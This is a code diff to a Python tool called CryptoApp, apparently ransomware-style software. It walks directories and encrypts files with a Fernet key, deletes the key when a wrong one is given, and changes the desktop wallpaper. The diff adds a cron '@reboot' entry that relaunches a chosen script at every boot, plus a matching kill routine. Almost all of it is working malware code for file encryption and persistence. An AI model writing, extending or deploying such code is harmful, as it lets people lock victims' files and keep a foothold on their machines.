@@ -2,6 +2,7 @@ from cryptography.fernet import Fernet
 from typing import Dict
 import sys
 import os
+from signal import SIGKILL
 import json
 from subprocess import call, run
 
@@ -33,9 +34,9 @@ class CryptoApp:
             
 
         # Initialize main variables
-        self.omittedFiles = ['.key', 'CryptoApp.py', 'index.py']
+        self.omittedFiles = ['.key', 'CryptoApp.py', 'index.py', '.cron_copy']
         self.extensionsToModify = []
-        self.KEY_PATH = os.path.realpath(KEY_PATH)
+        self.KEY_PATH = os.path.abspath(KEY_PATH)
         self.startingPath = startPath
         self.countFiles = 0
         self.countDirs = 0
@@ -45,12 +46,21 @@ class CryptoApp:
         except ValueError:
 
             # If the key is incorrect, delete it, and exit the program
-            print('Incorrect key! You can forget about decryption')
-            print('Removing key...')
+            print('[ERROR] Incorrect key! You can forget about decryption')
+            print('[INFO] Removing key...')
             os.remove(self.KEY_PATH)
 
             exit(1)
 
+
+
+    # Run a shell script with an output
+    def __getsh(self, command) -> any:
+        try:
+            result = run(command, capture_output=True, shell=True).stdout.decode('utf-8')
+            return result
+
+        except: return None
 
 
 
@@ -63,7 +73,6 @@ class CryptoApp:
         # Filter the file extensions
         if len(self.extensionsToModify):
             files = list( filter(lambda x: x.endswith(tuple(self.extensionsToModify)) or os.path.isdir(x), files) )
-
 
 
         # Loop through each file
@@ -89,30 +98,29 @@ class CryptoApp:
                 old_text = self.readFile(path)
                 if not old_text: continue
 
-                try:
-                    # Encrypt or decrypt the file
-                    if self.isEncrypted:
-                        new_text = self.fernet.decrypt(old_text)
-                    else:
-                        new_text = self.fernet.encrypt(old_text)
 
-                except:
-                    # Skip the file, if something went wrong
-                    print(f'Could not modify file: {path}')
-                    return
+                # Encrypt or decrypt the file
+                if self.isEncrypted:
+                    new_text = self.fernet.decrypt(old_text)
+                else:
+                    new_text = self.fernet.encrypt(old_text)
 
 
                 # Finally, write to the file its new content
                 self.writeFile(path, new_text)
-                print(f'{path} - modified')
+                print(f'[MOD] {path} - modified')
 
                 # Increment the modified files count
                 self.countFiles += 1
 
+
             except PermissionError:
                 # Skip if there is a permission error
-                print(f'Not permitted to operate on: {path}')
-                return
+                print(f'[WARN] Not permitted to operate on: {path}')
+
+            except:
+                # Skip if something went wrong
+                print(f'[ERROR] Could not modify file: {path}')
 
 
 
@@ -134,9 +142,9 @@ class CryptoApp:
         elif type == 'dec': prints = ['Decrypting...', 'Decrypted']
         else: prints = ['', '']
 
-        print(prints[0])
+        print(f'[START] {prints[0]}\n')
         self.__actionHandler()
-        print(f'{prints[1]} {self.countFiles} files')
+        print(f'\n[FINISH] {prints[1]} {self.countFiles} files')
 
 
 
@@ -207,7 +215,7 @@ class CryptoApp:
                         call(f'gsettings set org.gnome.desktop.background {style} file://{file}', shell=True)
 
         except:
-            print('Could not change the wallpaper')
+            print('[ERROR] Could not change a wallpaper')
 
 
 
@@ -220,23 +228,84 @@ class CryptoApp:
                 # Xfce4 Desktop. Tested with Virtual and monitor0. Not sure about the others
                 if target_de == 'xfce4':
                     for x in ['Virtual1', '0']:
-                        result = run(f'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor{x}/workspace0/last-image', capture_output=True, shell=True)
+                        result = self.__getsh(f'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor{x}/workspace0/last-image')
 
-                        # Decode the stdout
-                        out = result.stdout.decode('utf-8').rstrip()
+                        # Remove the line break
+                        out = result.rstrip()
                         if out: return out
 
-                # GNOME. Gets the dark theme
+                # GNOME. Get the dark theme
                 elif target_de == 'gnome':
-                    result = run('gsettings get org.gnome.desktop.background picture-uri-dark', capture_output=True, shell=True)
+                    result = self.__getsh('gsettings get org.gnome.desktop.background picture-uri-dark')
                     
-                    output = result.stdout.decode('utf-8').rstrip().replace('file://', '').replace("'", '')
+                    # Remove the "file://" and '' to get a clear url
+                    output = result.rstrip().replace('file://', '').replace("'", '')
 
             return output
 
         except:
-            print('Could not get the background')
+            print('[ERROR] Could not get a wallpaper')
             return None    
+
+
+
+    # Launch a specified script on startup using cron
+    def cronAction(self, target_os, type, scriptToStart):
+        # Check the OS
+        if target_os not in ['linux', 'mac']:
+            print(f'[ERROR] Running cron on {target_os}')
+            return
+
+        # Check if cron is installed
+        doesExist = self.__getsh('which crontab')
+        if not doesExist or 'not found' in doesExist:
+            print('[ERROR] cron is not installed on the system')
+            return
+
+
+        # File to save the original cron settings to
+        CRON_ORIGINAL = '.cron_copy'
+
+        if type == 'start':
+            CRON_ARG = 'crontab_arg'
+
+            # Check if a script exists
+            if not os.path.isfile(scriptToStart):
+                print(f'[ERROR]: Script {scriptToStart} not found')
+                return
+
+
+            # Get and save the current cron settings
+            current = self.__getsh('crontab -l')
+            self.writeFile(CRON_ORIGINAL, current)
+
+            # Add a new entry
+            current += f'\n@reboot python3 {scriptToStart}\n'
+            self.writeFile(CRON_ARG, current)
+            
+            # Save the new cron settings and run the script
+            call(f'crontab {CRON_ARG}', shell=True)
+            call(f'python3 {scriptToStart} &', shell=True)
+            os.remove(CRON_ARG)
+
+            print('[INFO] script launched')
+
+
+        elif type == 'stop' and os.path.isfile(CRON_ORIGINAL):
+            # Revert to the original cron settings
+            call(f'crontab {CRON_ORIGINAL}', shell=True)
+            os.remove(CRON_ORIGINAL)
+
+            try:
+                # Get the PID of the process
+                pid = self.__getsh(f"ps -aux | grep {scriptToStart} | awk '{{print $2}}'").split('\n')[0]
+
+                # And terminate that process
+                if pid and pid.isnumeric():
+                    os.kill(int(pid), SIGKILL)
+                    print('[INFO] script has been stopped')
+
+            except: return
 
 
 
@@ -252,7 +321,7 @@ class CryptoApp:
     # Read the file contents
     def readFile(self, path) -> str | None:
         if not os.path.isfile(path):
-            print(f'File: {path} does not exist')
+            print(f'[ERROR] File: {path} does not exist')
             return None
 
         with open(path, 'rb') as file:
